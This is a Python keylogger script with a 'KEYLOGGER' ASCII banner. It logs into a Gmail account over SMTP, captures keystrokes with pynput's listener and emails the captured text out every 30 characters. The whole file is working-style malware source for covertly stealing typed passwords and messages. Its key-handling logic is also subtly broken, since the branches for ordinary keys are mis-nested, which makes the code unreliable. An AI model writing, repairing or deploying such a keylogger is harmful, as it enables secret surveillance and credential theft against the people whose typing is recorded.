import getpass
import smtplib

from pynput.keyboard import Key, Listener

print('''          _              _    _        _            _             _            _              _              _            _      
        /\_\           /\ \ /\ \     /\_\         _\ \          /\ \         /\ \           /\ \           /\ \         /\ \    
       / / /  _       /  \ \\ \ \   / / /        /\__ \        /  \ \       /  \ \         /  \ \         /  \ \       /  \ \   
      / / /  /\_\    / /\ \ \\ \ \_/ / /        / /_ \_\      / /\ \ \     / /\ \_\       / /\ \_\       / /\ \ \     / /\ \ \  
     / / /__/ / /   / / /\ \_\\ \___/ /        / / /\/_/     / / /\ \ \   / / /\/_/      / / /\/_/      / / /\ \_\   / / /\ \_\ 
    / /\_____/ /   / /_/_ \/_/ \ \ \_/        / / /         / / /  \ \_\ / / / ______   / / / ______   / /_/_ \/_/  / / /_/ / / 
   / /\_______/   / /____/\     \ \ \        / / /         / / /   / / // / / /\_____\ / / / /\_____\ / /____/\    / / /__\/ /  
  / / /\ \ \     / /\____\/      \ \ \      / / / ____    / / /   / / // / /  \/____ // / /  \/____ // /\____\/   / / /_____/   
 / / /  \ \ \   / / /______       \ \ \    / /_/_/ ___/\ / / /___/ / // / /_____/ / // / /_____/ / // / /______  / / /\ \ \     
/ / /    \ \ \ / / /_______\       \ \_\  /_______/\__\// / /____\/ // / /______\/ // / /______\/ // / /_______\/ / /  \ \ \    
\/_/      \_\_\\/__________/        \/_/  \_______\/    \/_________/ \/___________/ \/___________/ \/__________/\/_/    \_\/     ''')


# set up the email
email = input('Enter email: ')
password = getpass.getpass(prompt='Password', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)


# logger
full_log = ''
word = ''
email_char_limit = 30 # set the number of characters b4 email is sent

def on_press(key):
    global word
    global full_log
    global email_char_limit
    global email

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = '' 
        elif key == Key.shift_l or key == Key.shift_r:
            return
        elif key == Key.backspace:
            word = word[:-1]
        else:
            char = f'{ key }'
            char = char[1:-1]
            word += char

        if key == key.esc:
            return False

def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )


with Listener(on_press = on_press)as listener:
    listener.join() 
